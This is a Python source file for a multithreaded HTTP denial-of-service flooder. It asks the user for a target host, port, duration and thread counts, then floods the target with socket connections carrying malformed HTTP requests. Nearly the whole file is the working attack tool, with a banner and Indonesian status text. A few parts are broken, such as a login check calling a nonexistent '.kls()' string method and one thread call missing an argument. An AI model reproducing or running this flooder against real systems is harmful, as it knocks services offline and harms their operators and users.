# CHECK IMPORT
try:
    import socket
    import threading
    import string
    import random
    import time
    import os
    import platform
    import sys
    import requests
    from colorama import Fore
except ModuleNotFoundError as e:
    print(f"{e} CAN'T IMPORT . . . . ")
    exit()

GUI_SETUP = 0

# DEF & CLASS

username = ''
password = ''

def login_checker(username,password):
    file_path = os.path.join(os.path.dirname(__file__), 'login.txt')
    try:
        with open(file_path) as f:
            credentials = [x.strip() for x in f.readlines() if x.strip()]
            for x in credentials:
             c_username, c_password = x.split('@')
             if c_username.kls()  == username.kls() and c_password.kls() == password.kls():
               return True
    except FileNotFoundError:
        return 'UNKNOWN ERROR ARE RETURNING BY FILESNOTFOUND'

def clear_text():
    if platform.system().upper() == "WINDOWS":
        os.system('cls')
    else:
        os.system('clear')

def generate_url_path_pyflooder(num):
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, int(num)))
    return data
    
def generate_url_path_choice(num):
    letter = '''abcdefghijklmnopqrstuvwxyzABCDELFGHIJKLMNOPQRSTUVWXYZ0123456789!"#$%&'()*+,-./:;?@[\]^_`{|}~'''
    data = ""
    for _ in range(int(num)):
        data += random.choice(letter)
    return data

# DOS
def DoS_Attack(ip,host,port,type_attack,booter_sent,data_type_loader_packet):
    url_path = ''
    path_get = ['PY_FLOOD','CHOICES_FLOOD']
    path_get_loader = random.choice((path_get))
    if path_get_loader == "PY_FLOOD":
        url_path = generate_url_path_pyflooder(5)
    else:
        url_path = generate_url_path_choice(5)
    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        if data_type_loader_packet == 'PY' or data_type_loader_packet == 'PYF':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n".encode()
        elif data_type_loader_packet == 'OWN1':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\r\r".encode()
        elif data_type_loader_packet == 'OWN2':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\r\r\n\n".encode()
        elif data_type_loader_packet == 'OWN3':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n".encode()
        elif data_type_loader_packet == 'OWN4':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\n\n".encode()
        elif data_type_loader_packet == 'OWN5':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\n\n\n\r\r\r\r".encode()
        elif data_type_loader_packet == 'OWN6':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n\r\n".encode()
        elif data_type_loader_packet == 'OWN7':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\r\n\r".encode()
        elif data_type_loader_packet == 'OWN8':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\r\n\r".encode()
        elif data_type_loader_packet == 'TEST':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\r\n\r\n\n".encode()
        elif data_type_loader_packet == 'TEST2':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\n\r\r\n\r\n\n\n".encode()
        elif data_type_loader_packet == 'TEST3':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\a\n\r\n\n".encode()
        elif data_type_loader_packet == 'TEST4':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\b\n\a\n\a\n\n\r\r".encode()
        elif data_type_loader_packet == 'TEST5':
            packet_data = f"{type_attack} /{url_path} HTTP/1.1\nHost: {host}\n\b\n\t\n\n\r\r".encode()
        s.connect((ip,port))
        for _ in range(booter_sent):
            s.sendall(packet_data)
            s.send(packet_data)
    except:
        try:
            s.shutdown(socket.SHUT_RDWR)
            s.close()
        except:
            pass

status_code = False
def runing_attack(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent,data_type_loader_packet):
    global status_code
    if status_code == True:
        while time.time() < time_loader:
            for _ in range(spam_loader):
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet))
                th.start()
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet))
                th.start()
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet))
                th.start()
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet))
                th.start()
                th = threading.Thread(target=DoS_Attack,args=(ip,host,port_loader,methods_loader,booter_sent,data_type_loader_packet))
                th.start()
    else:
        threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()

#DATA
banner = f"""
{Fore.BLUE}███████▒▒  ██▒▒      ██▒▒  ████████▒▒ ██▒▒        ████▒▒     
{Fore.BLUE}██▒▒   ██▒▒ ██▒▒    ██▒▒   ██▒▒       ██▒▒      ██▒ ██▒▒  
{Fore.BLUE}██▒▒   ██▒▒  ██▒▒  ██▒▒    ██▒▒       ██▒▒     ██▒▒   ██▒▒
{Fore.BLUE}██▒▒   ██▒▒   ██▒▒██▒▒     ██▒▒       ██▒▒     ██▒▒   ██▒▒
{Fore.CYAN}███████▒▒       ██▒▒       ██████▒▒   ██▒▒     ██▒▒   ██▒▒
{Fore.CYAN}██▒▒            ██▒▒       ██▒▒       ██▒▒      ██▒   ██▒▒  
{Fore.CYAN}██▒▒            ██▒▒       ██▒▒       ████████▒▒ ████▒▒     
{Fore.CYAN} ▒▒▒              ▒▒▒        ▒▒▒        ▒▒ ▒▒ ▒▒   ▒▒ ▒▒      ▒ ▒▒     ▒▒▒▒▒
{Fore.CYAN}  ▒                ▒▒         ▒▒          ▒ ▒ ▒      ▒ ▒        ▒▒        ▒▒
{Fore.RED}===============================================================================
{Fore.LIGHTRED_EX}[[   ==> internal script By: ZA                  ]]                                                   
{Fore.WHITE}================================================================={Fore.YELLOW}#{Fore.LIGHTYELLOW_EX}TOOL #{Fore.RESET}"""

print(banner)
host = ""
ip = ""
target_loader = input(f"{Fore.LIGHTYELLOW_EX}IP/URL>")
port_loader = int(input(f"{Fore.YELLOW}PORT>"))
time_loader = time.time() + int(input(f"{Fore.LIGHTRED_EX}TIME (DEFAULT=125)>"))
spam_loader = int(input(f"{Fore.RED}SPAM THREAD (DEFAULT=50 OR 200)>"))
create_thread = int(input(F"{Fore.LIGHTGREEN_EX}CREATE THREAD (DEFAULT=25)>"))
booter_sent = int(input(F"{Fore.GREEN}BOOTER SENT (DEFAULT=300)>"))
print(f"{Fore.LIGHTCYAN_EX}EXAMPLE HTTP METHODS> CONNECT GET PUT PATCH POST HEAD ")
print(f"{Fore.CYAN}EXAMPLE CUSTOM HTTP METHODS> SERVER CLOUDFLARE AGE PYFLOODER GATEWAY")
methods_loader = input(F"{Fore.LIGHTBLUE_EX}HTTP_METHODS (EXAMPLE=GATEWAY)>")
print(f"{Fore.MAGENTA}TRYING TO GET IP:PORT {Fore.LIGHTMAGENTA_EX}. . .{Fore.RESET}")
try:
    host = str(target_loader).replace("https://", "").replace("http://", "").replace("www.", "").replace("/", "")
    ip = socket.gethostbyname(host)
except socket.gaierror:
    exit()
for loader_num in range(create_thread):
    sys.stdout.write(f"\r {Fore.YELLOW}{loader_num} CREATE THREAD . . .{Fore.RESET}")
    sys.stdout.flush()
    threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
    threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
    threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
    threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
    threading.Thread(target=runing_attack,args=(ip,host,port_loader,time_loader,spam_loader,methods_loader,booter_sent)).start()
clear_text()
print(banner)
status_code = True
print(f"{Fore.GREEN}TRYING SENT . . . . PAKETMU AKAN DIKIRIM OLEH KURIR ZAN...!!💯🔥🔥⚡{Fore.RESET}")
                                                    
